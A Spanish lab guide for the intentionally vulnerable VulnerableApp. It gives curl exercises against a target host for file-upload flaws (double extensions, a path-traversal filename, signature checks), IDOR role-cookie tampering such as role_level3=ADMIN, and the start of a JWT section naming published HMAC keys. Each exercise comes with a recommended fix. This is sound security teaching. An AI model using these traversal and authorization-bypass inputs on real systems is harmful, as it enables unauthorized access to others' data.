**Corrección recomendada:** Almacenar fuera de una raíz pública, generar nombres no controlados por el cliente, permitir únicamente tipos verificados por contenido, servir descargas como attachment con un Content-Type seguro y aplicar una política CSP. Para HTML no confiable, no servirlo como documento ejecutable.

### fileupload-02 · LEVEL_6: contraste entre el substring .png.html aceptado y el control .html rechazado

La rama positiva debería responder isValid=true porque ^.+\.(png|jpeg) encuentra .png antes de .html; el control con va-marker.html debería responder isValid=false. Ambos usan el mismo contenido no ejecutable.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El test de código usa malicious.png.html con bytes de texto y confirma la aceptación. El control negativo aísla el efecto de la expresión no anclada al final. La respuesta content del positivo contiene un nombre aleatorio, por lo que no se debe adivinar la URL del archivo para puntuar.

printf '%s' 'VA_LAB_UPLOAD' > /tmp/va-upload.txt

```bash
curl -i -X POST http://target:9090/VulnerableApp/UnrestrictedFileUpload/LEVEL_6 -H 'Accept: application/json' -F 'file=@/tmp/va-upload.txt;filename=va-marker.png.html;type=text/plain'
```

```bash
curl -i -X POST http://target:9090/VulnerableApp/UnrestrictedFileUpload/LEVEL_6 -H 'Accept: application/json' -F 'file=@/tmp/va-upload.txt;filename=va-marker.html;type=text/plain'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Comparar los dos JSON: positivo $.isValid=true y control $.isValid=false; no usar sólo el HTTP 200, que el método devuelve tanto para aceptación como para rechazo."
}
```

**Pistas:**

La comprobación real usa find y no lower-case; .PNG no es un control equivalente en este nivel.

El primer y segundo HTTP 200 deben distinguirse leyendo isValid, no el status.

**Corrección recomendada:** No usar substring/sufijos como prueba de tipo; inspeccionar firma y decodificar el formato permitido, generar un nombre UUID y servir el resultado con un tipo seguro. Rechazar nombres con dobles extensiones y normalizar/contener la ruta antes de escribir.

### fileupload-03 · LEVEL_8: path traversal limitado al marcador autorizado y control de descarga contenida

Según Files.copy(root.resolve(fileName)) y los tests, la respuesta de la carga debería ser isValid=true aun cuando el nombre contiene ..; el código intenta alcanzar exclusivamente /tmp/va-training.txt. La carga normal va-contained.txt debe poder recuperarse con el preflight bajo la raíz. Una petición de descarga con .. debe ser rechazada o no rutear; no debe usarse para leer ningún otro archivo.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

La prueba es de escritura controlada, no de lectura de secretos. El marcador VA_LAB_FILE es inocuo y el único objetivo permitido es /tmp/va-training.txt. El PreflightController aplica normalize y startsWith a la descarga, por lo que la escritura vulnerable de LEVEL_8 y la lectura contenida son operaciones distintas. Un 200 sólo indica que el método aceptó/copio el multipart; no prueba por sí solo la existencia ni el contenido del archivo externo.

printf '%s' 'VA_LAB_FILE' > /tmp/va-fileupload.txt

```bash
curl -i -X POST http://target:9090/VulnerableApp/UnrestrictedFileUpload/LEVEL_8 -H 'Accept: application/json' -F 'file=@/tmp/va-fileupload.txt;filename=../../../tmp/va-training.txt;type=text/plain'
```

```bash
curl -i -X POST http://target:9090/VulnerableApp/UnrestrictedFileUpload/LEVEL_8 -H 'Accept: application/json' -F 'file=@/tmp/va-fileupload.txt;filename=va-contained.txt;type=text/plain'
```

```bash
curl -i http://target:9090/VulnerableApp/contentDispositionUpload/va-contained.txt
```

```bash
curl -i --path-as-is http://target:9090/VulnerableApp/contentDispositionUpload/../../../tmp/va-training.txt
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "true"
}
```

**Pistas:**

El último GET es sólo un control de rechazo del preflight; un 404 puede provenir de normalización del router o de la contención, no confirma por sí mismo qué ocurrió en la escritura.

No cambies el destino a /etc, al classpath, a una configuración ni a ningún archivo del host; /tmp/va-training.txt es el único destino autorizado.

**Corrección recomendada:** Obtener sólo un nombre base seguro o generar un UUID, resolver y normalizar, verificar que el resultado empieza por la raíz permitida antes de Files.copy y separar almacenamiento de descarga. No aceptar rutas absolutas ni segmentos ..; servir descargas como attachment y comprobar autorización.

### fileupload-04 · LEVEL_9 frente a LEVEL_10: aceptación pequeña sin provocar consumo de recursos

LEVEL_9 debería aceptar el archivo pequeño no imagen (isValid=true). El mismo archivo/nombre en LEVEL_10 debería ser rechazado (isValid=false) por no terminar en .png o .jpeg. Este contraste no mide ni intenta DoS.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El objetivo de LEVEL_9 es la ausencia de límite propio y el override del MultipartFilter, pero el límite de seguridad del laboratorio prohíbe convertirlo en una prueba de denegación de servicio. Un archivo diminuto demuestra sólo la rama de aceptación y el contraste de validadores; no demuestra impacto de consumo.

printf '%s' 'VA_LAB_SMALL' > /tmp/va-small.txt

```bash
curl -i -X POST http://target:9090/VulnerableApp/UnrestrictedFileUpload/LEVEL_9 -H 'Accept: application/json' -F 'file=@/tmp/va-small.txt;filename=va-small.txt;type=text/plain'
```

```bash
curl -i -X POST http://target:9090/VulnerableApp/UnrestrictedFileUpload/LEVEL_10 -H 'Accept: application/json' -F 'file=@/tmp/va-small.txt;filename=va-small.txt;type=text/plain'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Comparar $.isValid=true en LEVEL_9 con $.isValid=false en LEVEL_10; no enviar archivos grandes y no puntuar el nivel 9 por agotamiento de disco/memoria."
}
```

**Pistas:**

El método devuelve HTTP 200 también para Input is invalid; inspecciona content e isValid.

No sustituyas el marcador por /dev/zero, un archivo enorme, un bucle o una prueba de concurrencia.

**Corrección recomendada:** Imponer límites de tamaño por petición y por parte antes de buffering, cuotas y autenticación, rechazar temprano, usar streaming con límites y monitorización. Mantener límites coherentes entre servidor, resolver multipart y controlador.

### fileupload-05 · LEVEL_10, LEVEL_11 y LEVEL_12: control de extensión contra firma y límite pequeño

Un archivo cuyo nombre termina en .png pero cuyo cuerpo es sólo VA_LAB_NOT_IMAGE debería pasar en LEVEL_10 y ser rechazado en LEVEL_11/LEVEL_12. El archivo pequeño con firma PNG debería ser aceptado por LEVEL_11 y LEVEL_12, con content basado en UUID y extensión detectada, no en el nombre enviado.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El contraste sigue exactamente los tests: LEVEL_11 rechaza shell.png con PHP/texto y acepta una firma PNG; LEVEL_12 conserva esa comprobación y añade <=512 KiB. La carga es mínima y no intenta el caso sobredimensionado. La firma es una defensa mejor que el sufijo, pero no equivale a decodificar todo el formato.

printf '\x89PNG\r\n\x1a\nVA_LAB_PNG' > /tmp/va-png.bin

printf '%s' 'VA_LAB_NOT_IMAGE' > /tmp/va-not-image.bin

```bash
curl -i -X POST http://target:9090/VulnerableApp/UnrestrictedFileUpload/LEVEL_10 -H 'Accept: application/json' -F 'file=@/tmp/va-not-image.bin;filename=va-fake.png;type=image/png'
```

```bash
curl -i -X POST http://target:9090/VulnerableApp/UnrestrictedFileUpload/LEVEL_11 -H 'Accept: application/json' -F 'file=@/tmp/va-not-image.bin;filename=va-fake.png;type=image/png'
```

```bash
curl -i -X POST http://target:9090/VulnerableApp/UnrestrictedFileUpload/LEVEL_11 -H 'Accept: application/json' -F 'file=@/tmp/va-png.bin;filename=va-photo.png;type=image/png'
```

```bash
curl -i -X POST http://target:9090/VulnerableApp/UnrestrictedFileUpload/LEVEL_12 -H 'Accept: application/json' -F 'file=@/tmp/va-png.bin;filename=va-photo.png;type=image/png'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Comparar los JSON: LEVEL_10 acepta por nombre; LEVEL_11 y LEVEL_12 rechazan el control sin firma y aceptan la firma mínima. Confirmar que el content aceptado no contiene el nombre controlado por el cliente; no interpretar isValid como análisis completo de imagen."
}
```

**Pistas:**

El primer printf sólo crea bytes locales inocuos; no contiene código ejecutable.

LEVEL_11 y LEVEL_12 devuelven nombres UUID, así que no construyas una URL suponiendo que conserva va-photo.png.

No intentes superar 512 KiB: la restricción del ejercicio excluye pruebas de consumo.

**Corrección recomendada:** Decodificar y re-encodar imágenes con una biblioteca segura, limitar dimensiones y tamaño, generar nombres UUID, eliminar metadatos si aplica y servir desde un origen separado con Content-Type nosniff y Content-Disposition adecuado.

### Límites de esta familia

[
  "El informe se limita al árbol fileupload, su configuración/handler estático, el controlador público necesario para explicar la composición de rutas, las anotaciones de mapping, el bean de respuesta, el template, el payload attackvector y los tests relevantes del commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a. No inventa rutas ni niveles fuera de esta familia.",
  "La verificación es por lectura de código y tests del repositorio; no se ejecutaron las llamadas contra target, Mailpit ni receiver. Por tanto, los campos expected describen el resultado que el código permite esperar, no una promesa de que el despliegue aislado esté operativo.",
  "Un HTTP 200 es parte del contrato incluso para Input is invalid y no prueba aceptación: hay que revisar el JSON content/isValid. Del mismo modo, que un marcador o una URL se refleje no prueba ejecución XSS; la ejecución DOM requiere una observación manual controlada y nunca se debe atribuir puntaje por un click.",
  "No hay un caso IDOR en esta familia; por ello se aplica la misma regla de honestidad de forma general: un 200 nunca probaría IDOR sin demostrar acceso indebido a un recurso distinto y autorizado como control.",
  "LEVEL_7 depende de un carácter NUL en el nombre visto por Java. Curl, multipart, proxies y el contenedor pueden rechazarlo, escaparlo o normalizarlo; el test unitario con MockMultipartFile no resuelve esa incertidumbre de transporte.",
  "En LEVEL_8 la escritura fuera de contentDispositionRoot puede no tener un read-back seguro: PreflightController rechaza rutas que normalizadas salen de la raíz y el router puede normalizar segmentos .. antes de invocar el método. Un 404 en ese GET no distingue necesariamente routing de la comprobación de contención.",
  "LEVEL_9 se documenta sin generar archivos grandes, concurrencia ni presión de disco/memoria. Además del límite propio ausente, la cadena HTTP puede tener límites de proxy, contenedor o framework que no están representados por el test unitario de 1024 bytes.",
  "LEVEL_10 aparece como Variant.SECURE aunque acepta bytes arbitrarios si el nombre termina en .png/.jpeg; LEVEL_11 sólo comprueba una firma inicial y LEVEL_12 añade 512 KiB. Son diferencias del código, no garantías de un servicio seguro de producción.",
  "Los prefijos RANDOM y los nombres UUID hacen que una URL de archivo aceptado pueda ser variable. Los checks propuestos puntúan sólo propiedades observables y explícitas; no intentan inferir una URL, una ejecución de navegador, lectura de secretos ni impacto de disponibilidad."
]

## Referencias directas y acceso indebido a objetos

Esta familia modela referencias directas a objetos de usuario (el parámetro id o el identificador guardado en una cookie) y muestra la diferencia entre autenticar una sesión y autorizar cada objeto solicitado. La base de datos de la imagen contiene, según data.sql, los perfiles 1=Alice (USER, salario 50000), 2=Bob (USER, salario 60000) y 3=Charlie (ADMIN, salario 70000). El flujo de login es POST sobre la misma ruta de cada nivel, con username y password como formulario; el servicio genera JWT HS256 firmado con un secreto aleatorio de vida de la instancia y lo valida antes de atender el GET. El envoltorio JSON tiene content e isValid. Los niveles 1 a 4 devuelven HTTP 200 incluso para varios rechazos; el nivel 5 diferencia 401, 403, 404 y 200. El objetivo de laboratorio es observar autorización a nivel de objeto, no modificar datos ni ejecutar comandos.

### Todos los niveles originales

#### `GET para perfil; POST para login /VulnerableApp/IDORVulnerability/LEVEL_1`

**Entrada:** {
  "GET": {
    "id": "Integer opcional; el valor seleccionado se envía como id=1, 2 o 3",
    "cookie": "token_level1: JWT firmado obligatorio para entrar al método"
  },
  "POST": {
    "username": "Alice, Bob o Charlie en la semilla mostrada",
    "password": "Formulario application/x-www-form-urlencoded; la plantilla y las pruebas usan P@ssw0rd!2026",
    "response_cookie": "token_level1, HttpOnly, válido durante 3600 segundos"
  }
}

El GET valida que el token sea válido y luego consulta id directamente con SELECT ... WHERE id. No compara el id solicitado con el userId del token. Con un token de Alice, id=2 puede devolver el objeto de Bob y su salario; id=3 puede devolver el de Charlie.

Es el caso base de IDOR por ausencia de autorización a nivel de objeto. Sin cookie devuelve el mensaje Provide login or token en HTTP 200; un id inexistente devuelve User not found en HTTP 200. El test unitario level1_ShouldAllowAccessToAnyId usa un token válido y un perfil con id distinto, pero no sustituye una prueba HTTP integrada. La UI usa textContent para presentar el JSON; no es un ejercicio de XSS.

#### `GET para perfil; POST para login /VulnerableApp/IDORVulnerability/LEVEL_2`

**Entrada:** {
  "GET": {
    "query": "No usa id; toma el identificador de la cookie userId_level2",
    "cookies": "token_level2 (JWT firmado) y userId_level2 (Integer controlado por el cliente)"
  },
  "POST": {
    "username": "Alice, Bob o Charlie",
    "password": "Formulario application/x-www-form-urlencoded",
    "response_cookies": "token_level2 HttpOnly y userId_level2 sin HttpOnly, ambos con vida de 3600 segundos"
  }
}

El GET verifica la firma del token, pero no ata userId_level2 al subject del token. Por eso una sesión autenticada como Alice puede conservar su token y cambiar userId_level2 de 1 a 2 para consultar a Bob. El método no recibe un parámetro id.

La debilidad es la confianza en una identidad de objeto almacenada del lado cliente. Sin ambas cookies devuelve Please login first. en HTTP 200. Un valor no entero para userId_level2 puede ser rechazado por la conversión de Spring antes de entrar al método; no es necesario para el ejercicio.

#### `GET para perfil; POST para login /VulnerableApp/IDORVulnerability/LEVEL_3`

**Entrada:** {
  "GET": {
    "id": "Integer opcional; si falta, usa el userId del JWT",
    "cookies": "token_level3 (JWT firmado) y role_level3 (texto no firmado; si falta se usa el rol del JWT)"
  },
  "POST": {
    "username": "Alice, Bob o Charlie",
    "password": "Formulario application/x-www-form-urlencoded",
    "response_cookies": "token_level3 HttpOnly y role_level3 modificable por el cliente"
  }
}

El token firmado proporciona tokenUserId, pero la decisión de privilegios toma role_level3 si existe. Con role_level3=ADMIN, la condición de administrador permite cualquier id; la respuesta incluso sobrescribe el rol presentado en el perfil con el valor de la cookie. Con role_level3=USER, pedir un id ajeno produce Access Denied - Insufficient privileges en HTTP 200 con isValid=false.

El payload original describe el escalamiento por cookie de rol. No hace falta ni es seguro intentar alterar el JWT: el servicio valida su firma y la prueba de servicio confirma que un payload manipulado falla. El control positivo de autorización es pedir el propio id con role_level3=USER; el control negativo para la vulnerabilidad es pedir id=3 después de establecer role_level3=ADMIN.

#### `GET para perfil; POST para login /VulnerableApp/IDORVulnerability/LEVEL_4`

**Entrada:** {
  "GET": {
    "id": "Integer opcional; si falta, usa el userId del JWT",
    "cookies": "token_level4 (JWT firmado) y role_level4 (Base64 URL-safe sin padding, no firmado)"
  },
  "POST": {
    "username": "Alice, Bob o Charlie",
    "password": "Formulario application/x-www-form-urlencoded",
    "response_cookies": "token_level4 HttpOnly y role_level4 codificado con Base64 URL-safe sin padding"
  }
}

La aplicación decodifica role_level4 con Base64.getUrlDecoder y después aplica la misma condición administrativa del nivel 3. El valor codificado para USER es VVNFUg y el valor codificado para ADMIN es QURNSU4. La cookie no está firmada, por lo que un usuario autenticado puede sustituir la representación por QURNSU4 y acceder a otro id.

Codificar no es autenticar ni integrar autorización: Base64 es reversible y no aporta integridad. Una codificación inválida hace que el rol decodificado sea null y normalmente impide el bypass, pero no debe usarse como prueba principal. Los tests level4_ShouldAllowOpaqueIdAccess y level4_ShouldAllowAccessToAnyOpaqueIdRegardlessOfRole cubren el caso tamperable.

#### `GET para perfil; POST para login /VulnerableApp/IDORVulnerability/LEVEL_5`

**Entrada:** {
  "GET": {
    "id": "Integer obligatorio para obtener un perfil",
    "cookie": "token_level5 (JWT firmado); el rol del token no se toma como autoridad"
  },
  "POST": {
    "username": "Alice, Bob o Charlie",
    "password": "Formulario application/x-www-form-urlencoded",
    "response_cookie": "token_level5 HttpOnly, válido durante 3600 segundos"
  }
}

El servidor valida el JWT, obtiene tokenUserId y consulta de nuevo el rol real de ese usuario en idor_users. Solo permite el objeto propio o cualquier objeto si el rol real almacenado es ADMIN. Usuario normal contra objeto ajeno devuelve HTTP 403 con Access Denied - Proper RBAC enforced; token ausente o inválido devuelve HTTP 401; un administrador sembrado como Charlie puede consultar Bob con HTTP 200.

Es el nivel original marcado Variant.SECURE y el único que consulta el rol en la base de datos antes de autorizar. No debe etiquetarse como vulnerabilidad porque un administrador pueda leer perfiles ajenos: ese es el permiso explícito del modelo RBAC. Los tests verifican tanto el bloqueo de una escalada como el acceso legítimo del administrador.

### idor-01 · Nivel 1: comparar el objeto propio con un id ajeno usando el mismo token

Expectativa derivada del código, no resultado observado: tras autenticar Alice, id=1 debería devolver content.username=Alice e isValid=true; id=2 debería devolver content.username=Bob e isValid=true, ambos con HTTP 200. La pareja de requests es importante: comprobar solamente un 200 o solamente un nombre no establece por sí mismo que hubo IDOR.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El servicio solo valida la firma del token y el controlador pasa el Integer id directamente a fetchUserById. La identidad del subject no participa en la autorización, de modo que la misma sesión de Alice puede consultar otro registro.

```bash
curl -i -c /tmp/va-idor-l1.cookies -X POST http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-urlencode 'username=Alice' --data-urlencode 'password=P@ssw0rd!2026'
```

```bash
curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-urlencode 'id=1' -b /tmp/va-idor-l1.cookies
```

```bash
curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_1 --data-urlencode 'id=2' -b /tmp/va-idor-l1.cookies
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Bob"
}
```

**Pistas:**

Con -c se conserva el token que el servidor emita; -b lo reenvía sin exponerlo al navegador.

El control propio y la consulta ajena deben usar el mismo cookie jar y cambiar únicamente id.

No uses ids fuera de 1, 2 y 3 ni intentes payloads de inyección.

**Corrección recomendada:** Derivar la autorización del sujeto autenticado y comprobar en servidor que puede leer el objeto solicitado; para un usuario normal comparar tokenUserId con id y devolver una respuesta de denegación uniforme. No confiar en identificadores enviados por cookie o query string.

### idor-02 · Nivel 2: alterar solo userId_level2, no el JWT

Expectativa derivada del código, no resultado observado: la cookie token_level2 de Alice debería seguir siendo válida mientras userId_level2=2 hace que content.username sea Bob, content.userId sea 2 e isValid sea true. Con userId_level2=1 como control, el resultado esperado es Alice.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El controlador verifica el JWT, pero usa loggedInUser, obtenido de una cookie cliente, como única entrada de fetchUserById. No compara esa cookie con el subject firmado. El ejercicio demuestra manipulación de referencia, no falsificación criptográfica.

```bash
curl -i -c /tmp/va-idor-l2.cookies -X POST http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_2 --data-urlencode 'username=Alice' --data-urlencode 'password=P@ssw0rd!2026'
```

```bash
curl -i http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_2 -b /tmp/va-idor-l2.cookies
```

Copiar el valor token_level2 de la cabecera Set-Cookie de la respuesta anterior y usarlo sin modificar en el siguiente control de laboratorio:

```bash
curl -i http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_2 -H 'Cookie: token_level2=<TOKEN_DE_ALICE>; userId_level2=2'
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Bob"
}
```

**Pistas:**

El primer GET con el jar comprueba el comportamiento normal con el userId emitido por login.

En la última orden sustituye únicamente <TOKEN_DE_ALICE> por el valor recibido; no edites ningún JWT.

El check Bob es una señal útil, pero debe interpretarse junto al control Alice y la identidad con la que se inició sesión.

**Corrección recomendada:** Eliminar userId_level2 como autoridad: extraer siempre el userId del token o de una sesión del servidor y comprobar autorización de objeto en el backend. Marcar cookies sensibles Secure, HttpOnly y SameSite es complementario, no reemplaza la autorización.

### idor-03 · Nivel 3: cambiar role_level3 a ADMIN para probar el bypass de autorización

Expectativa derivada del código, no resultado observado: con role_level3=USER y id=3 se espera HTTP 200, isValid=false y Access Denied - Insufficient privileges; con el mismo token y role_level3=ADMIN se espera HTTP 200, isValid=true y content.username=Charlie.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El subject del JWT sigue identificando a Alice, pero la condición ROLE_ADMIN.equalsIgnoreCase(role) toma precedencia y role es la cookie no firmada si está presente. Así, un dato controlado por el cliente decide si puede leer cualquier id.

```bash
curl -i -c /tmp/va-idor-l3.cookies -X POST http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_3 --data-urlencode 'username=Alice' --data-urlencode 'password=P@ssw0rd!2026'
```

Copiar el valor token_level3 de Set-Cookie y ejecutar el control no privilegiado: curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_3 --data-urlencode 'id=3' -H 'Cookie: token_level3=<TOKEN_DE_ALICE>; role_level3=USER'

Con el mismo token, ejecutar la variante de laboratorio que cambia solo la cookie de rol: curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_3 --data-urlencode 'id=3' -H 'Cookie: token_level3=<TOKEN_DE_ALICE>; role_level3=ADMIN'

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Charlie"
}
```

**Pistas:**

La prueba positiva no requiere modificar el token; la firma debe permanecer intacta.

El control USER contra id=3 distingue denegación de autorización de error de autenticación.

No atribuyas éxito a un click de la UI: compara el JSON del control y de la variante con el mismo token.

**Corrección recomendada:** Calcular el rol en el servidor desde una sesión o desde claims firmados validados, y aplicar autorización de objeto en backend. Nunca permitir que una cookie de rol no autenticada reemplace la autoridad del servidor.

### idor-04 · Nivel 4: sustituir el rol Base64 por QURNSU4

Expectativa derivada del código, no resultado observado: role_level4=VVNFUg (USER) con id=2 debería devolver HTTP 200, isValid=false y Access Denied - Insufficient privileges; el mismo token con role_level4=QURNSU4 (ADMIN) debería devolver HTTP 200, isValid=true y content.username=Bob.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El controlador decodifica el texto Base64 URL-safe y usa el resultado como rol confiable. QURNSU4 es solamente la codificación sin padding de ADMIN; no es una firma ni un mecanismo de autorización.

```bash
curl -i -c /tmp/va-idor-l4.cookies -X POST http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_4 --data-urlencode 'username=Alice' --data-urlencode 'password=P@ssw0rd!2026'
```

Copiar el valor token_level4 de Set-Cookie y ejecutar el control con rol codificado USER: curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_4 --data-urlencode 'id=2' -H 'Cookie: token_level4=<TOKEN_DE_ALICE>; role_level4=VVNFUg'

Repetir cambiando solo la representación Base64 URL-safe del rol: curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_4 --data-urlencode 'id=2' -H 'Cookie: token_level4=<TOKEN_DE_ALICE>; role_level4=QURNSU4'

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Bob"
}
```

**Pistas:**

VVNFUg representa USER y QURNSU4 representa ADMIN en Base64 URL-safe sin padding.

El token copiado debe ser exactamente el del login de Alice y no debe editarse.

Un HTTP 200 se usa en este nivel tanto para el control denegado como para el bypass; lee isValid y content además del status.

**Corrección recomendada:** No almacenar la autoridad de rol en un valor cliente modificable. Usar una sesión de servidor o claims firmados y revalidar permisos en cada acceso al objeto; tratar Base64 solo como representación, nunca como protección.

### idor-05 · Nivel 5: control negativo, usuario normal no puede consultar otro perfil

Expectativa derivada del código, no resultado observado: el token de Alice y id=2 deberían producir HTTP 403, isValid=false y content=Access Denied - Proper RBAC enforced. El código no usa el rol declarado en el JWT para elevar permisos; consulta el rol real de id=1 en la base.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

Este es el control negativo del nivel seguro: Alice solo puede leer su propio objeto. El servidor reconsulta el rol persistido mediante SQL_ROLE_BY_ID y rechaza el id de Bob antes de fetchUserById.

```bash
curl -i -c /tmp/va-idor-l5-alice.cookies -X POST http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'username=Alice' --data-urlencode 'password=P@ssw0rd!2026'
```

```bash
curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'id=2' -b /tmp/va-idor-l5-alice.cookies
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Confirmar conjuntamente HTTP 403, $.isValid=false y $.content='Access Denied - Proper RBAC enforced'; un único 200 o un texto aislado no es una prueba suficiente"
}
```

**Pistas:**

El status 403 es significativo en este nivel, a diferencia de los niveles 1 a 4.

No confundas el campo isValid del cuerpo con el estado HTTP: inspecciona ambos con -i.

Esta prueba no necesita cambiar cookies ni decodificar tokens.

**Corrección recomendada:** Mantener autorización de objeto en servidor, usar el sujeto autenticado como fuente de identidad y separar claramente permisos de usuario y de administrador. Registrar denegaciones sin revelar datos del objeto protegido.

### idor-06 · Nivel 5: control positivo, administrador real puede consultar Bob

Expectativa derivada del código, no resultado observado: si la semilla indicada está activa, el login de Charlie (id=3, rol ADMIN en la base) seguido de id=2 debería producir HTTP 200, isValid=true y content.username=Bob. Esto es autorización legítima y no debe contarse como IDOR.

**Puntaje:** 0 XP. Práctica guiada sin puntaje automático.

El contraste con Alice demuestra por qué ver un objeto ajeno no basta para etiquetar una vulnerabilidad: el nivel 5 permite explícitamente al rol ADMIN persistido acceder a otros perfiles y no confía en un rol cliente alterado.

```bash
curl -i -c /tmp/va-idor-l5-charlie.cookies -X POST http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'username=Charlie' --data-urlencode 'password=P@ssw0rd!2026'
```

```bash
curl -i --get http://target:9090/VulnerableApp/IDORVulnerability/LEVEL_5 --data-urlencode 'id=2' -b /tmp/va-idor-l5-charlie.cookies
```

**Criterio del verificador:**

```json
{
  "kind": "manual",
  "value": "Bob"
}
```

**Pistas:**

Compara este resultado con el control negativo de Alice; la identidad de login es la única variable que cambia.

No edites el token ni role cookies: el nivel 5 no recibe una cookie de rol autorizante.

Si el entorno no tiene la semilla indicada, registra esa incertidumbre en vez de inferir que falló la regla.

**Corrección recomendada:** Conservar la comprobación de rol en la base o una fuente de autoridad equivalente, documentar la matriz RBAC y probar tanto denegaciones de usuarios normales como accesos autorizados de administradores.

### Límites de esta familia

[
  "La revisión se limitó al commit 4df80bbcd42682ecf26334f12c568e0f4a326c1a y a la familia idor, más las anotaciones/controlador central y el bean necesarios para resolver las rutas. No se inspeccionaron ni se ejercitaron otras familias de vulnerabilidades.",
  "No se ejecutaron los comandos curl contra target:9090 en esta revisión. Los expected son predicciones derivadas de código, plantillas, semillas, anotaciones y tests unitarios; no son una afirmación de que el contenedor, el perfil public, la base o las credenciales estén disponibles en el momento del ejercicio.",
  "P@ssw0rd!2026 aparece en las plantillas y pruebas; data.sql contiene hashes, no contraseñas en claro. Si la imagen de laboratorio fue resembrada o cambió la configuración, el login puede no aceptar esa contraseña aunque el código leído la use como valor de entrenamiento.",
  "El JWT se firma con un secreto aleatorio por instancia. Un token de otra instancia, de una ejecución anterior o de otro cookie jar no es un control válido; cada ejercicio debe hacer login y consultar en la misma instancia target.",
  "Un HTTP 200 no demuestra IDOR. En los niveles 1 a 4 hay que comparar identidad autenticada, objeto propio y objeto ajeno, y verificar el contenido de la respuesta; una coincidencia JSON aislada tampoco prueba el contexto de sesión. En el nivel 5 hay que mirar a la vez HTTP status, isValid y content.",
  "El reflejo de un valor en una respuesta no prueba ejecución de JavaScript, no hay que atribuir puntaje por hacer click en la UI y esta familia no requiere ni autoriza payloads XSS. La UI usa textContent para los campos de perfil, por lo que el verificador propuesto debe ser HTTP/JSON y no visual.",
  "Los tests IDORVulnerabilityTest usan mocks y llamadas directas a métodos; IDORLoginServiceTest verifica firma, expiración y rechazo de tokens manipulados. No constituyen una prueba de integración HTTP con cookies, routing, H2 y serialización simultáneos.",
  "El acceso de Charlie a Bob en LEVEL_5 es una autorización administrativa esperada por el código y la semilla, no una vulnerabilidad. Si un despliegue cambia los roles, deben actualizarse los controles antes de interpretar el resultado.",
  "Los comandos están restringidos a los endpoints inocuos del laboratorio y a los datos de los tres usuarios sembrados. No incluyen comandos externos, inyección, lectura de secretos del host, reverse shells, solicitudes a Mailpit/receiver ni operaciones destructivas."
]

## Tokens JWT y validación criptográfica

La clase JWTVulnerability expone sus métodos mediante @VulnerableAppRequestMapping(value = LEVEL_n); la anotación es una especialización de Spring @RequestMapping y por defecto usa GET. El controlador central publica cada nombre de vulnerabilidad y nivel bajo /VulnerableApp/{nombre}/{LEVEL}; para esta familia el nombre es JWTVulnerability, por lo que las rutas anotadas son /VulnerableApp/JWTVulnerability/LEVEL_1 a LEVEL_10 y LEVEL_13 a LEVEL_19. Los niveles 1 a 16 muestran implementaciones deliberadamente vulnerables y los niveles 17 a 19 son variantes marcadas Variant.SECURE. El código separa el transporte del token (query JWT, cookie JWT o cabecera Authorization) de la verificación: los validadores vulnerables recalculan firmas con reglas inseguras o confían en datos del encabezado, mientras que los seguros fijan algoritmo y clave, rechazan tokens malformados y no reflejan el token recibido. Las claves publicadas en SymmetricAlgoKeys.json son HS256/password para LOW y HS256/12309jansdu912jnas^90nqwq!@!#oqihr82343n para HIGH; los niveles seguros no usan esas claves publicadas, sino claves aleatorias generadas al crear la instancia. El recurso JWTVulnerabilityPayload.properties solo aporta el payload documental del ataque none; los demás tokens de las tarjetas aparecen como constantes en los tests.

### Todos los niveles originales

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_1`

**Entrada:** {
  "query": [
    "JWT opcional; si falta, se genera un token; si existe, se valida"
  ],
  "headers": []
}

Usa customHMACValidator con HS256 y la clave HIGH. El token válido produce 200 y no se devuelve en content; un token inválido produce 401 y se refleja en content. La UI JavaScript envía JWT en la URL.

CLIENT_SIDE_VULNERABLE_JWT / JWT_URL_EXPOSING_SECURE_INFORMATION: el token viaja como parámetro de consulta y el endpoint entrega un token recién generado en el cuerpo. El validador de firma de este nivel sí fija HS256, por lo que la debilidad documentada es la exposición por URL, no un bypass de firma.

#### `GET /VulnerableApp/JWTVulnerability/LEVEL_2`

**Entrada:** {
  "query": [
    "fetch=true para generar un token; sin fetch se lee Cookie: JWT=<token>"
  ],
  "headers": [
    "Cookie: JWT=<token>"
  ]
}

Genera o valida un JWT HS256 HIGH en cookie y emite Set-Cookie. El cookie generado no añade HttpOnly ni Secure.

CLIENT_SIDE_VULNERABLE_JWT / COOKIE_CONTAINING_JWT_TOKEN_SECURITY_ATTRIBUTES_MISSING. Para una petición de validación el código espera una cabecera Cookie; usar fetch=true evita el camino que itera una lista de cookies ausente.

